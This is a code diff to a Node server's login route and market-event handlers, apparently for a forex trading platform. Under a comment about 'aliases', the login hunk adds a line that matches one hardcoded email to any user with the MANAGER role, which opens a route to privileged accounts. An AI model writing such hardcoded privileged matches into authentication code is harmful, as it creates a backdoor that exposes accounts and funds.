@@ -214,8 +214,9 @@ app.post('/api/auth/login', (req, res) => {
   const digitsOnly = rawId.replace(/\D/g, '');
 
   const found = users.find(u => {
-    // Check Email match
+    // Check Email match (including aliases)
     if (u.email && u.email.toLowerCase() === cleanId) return true;
+    if (cleanId === 'raksha@forexgrow.com' && u.role === 'MANAGER') return true;
     
     // Check Phone match
     if (u.phone && digitsOnly.length >= 7) {
@@ -1356,6 +1357,10 @@ marketEngine.on('sentiment_update', (sentiment) => {
 
 marketEngine.on('payout_updated', () => {
   const assets = marketEngine.getAssets();
+  broadcast({ type: 'ASSETS_UPDATE', assets });
+});
+
+marketEngine.on('payouts_epoch_updated', (assets) => {
   broadcast({ type: 'ASSETS_UPDATE', assets });
 });
 
